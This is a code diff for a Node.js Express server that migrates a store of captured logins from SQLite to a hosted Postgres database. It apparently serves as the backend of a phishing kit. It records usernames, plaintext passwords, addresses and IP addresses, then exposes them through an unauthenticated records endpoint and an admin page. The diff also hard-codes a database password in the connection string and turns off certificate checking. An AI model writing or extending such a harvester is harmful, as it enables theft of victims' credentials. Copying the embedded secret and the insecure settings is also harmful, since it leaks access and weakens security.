@@ -1,40 +1,34 @@
 const express = require('express');
 const path = require('path');
-const sqlite3 = require('sqlite3').verbose();
-const WebSocket = require('ws');
+const { Pool } = require('pg');
 
 const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-const db = new sqlite3.Database('./login_records.db');
+// Supabase Connection
+const pool = new Pool({
+    connectionString: 'postgresql://postgres:[ibnaira1999@]@db.bjyhgxqromtghuvnozog.supabase.co:5432/postgres',
+    ssl: { rejectUnauthorized: false }
+});
 
-db.run(`CREATE TABLE IF NOT EXISTS records (
-    id INTEGER PRIMARY KEY,
+// Create table
+pool.query(`CREATE TABLE IF NOT EXISTS records (
+    id SERIAL PRIMARY KEY,
     type TEXT,
     username TEXT,
     password TEXT,
     address TEXT,
     ip TEXT,
     timestamp TEXT
-)`);
-
-const wss = new WebSocket.Server({ port: 8080 });
-
-function broadcastUpdate() {
-    wss.clients.forEach(client => {
-        if (client.readyState === WebSocket.OPEN) {
-            client.send(JSON.stringify({ type: 'update' }));
-        }
-    });
-}
+)`).catch(err => console.log("Table error:", err));
 
 function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
-    db.run("INSERT INTO records (type, username, password, address, ip, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
-        [type, username, password, address, ip, timestamp], () => {
-            broadcastUpdate();   // Real-time push
-        });
+    pool.query(
+        "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
+        [type, username, password, address, ip, timestamp]
+    );
 }
 
 // Routes
@@ -54,25 +48,21 @@ app.post('/api/login', (req, res) => {
     res.json({ success: true });
 });
 
-app.get('/api/records', (req, res) => {
-    db.all("SELECT * FROM records ORDER BY id DESC", [], (err, rows) => {
-        res.json(rows);
-    });
+app.get('/api/records', async (req, res) => {
+    const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
+    res.json(result.rows);
 });
 
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
-app.post('/api/clear', (req, res) => {
-    db.run("DELETE FROM records");
-    broadcastUpdate();
+app.post('/api/clear', async (req, res) => {
+    await pool.query("DELETE FROM records");
     res.json({ message: 'Cleared' });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`🚀 Server running with Supabase Permanent Storage`);
 });
-
-console.log(`📡 WebSocket server running on port 8080`);
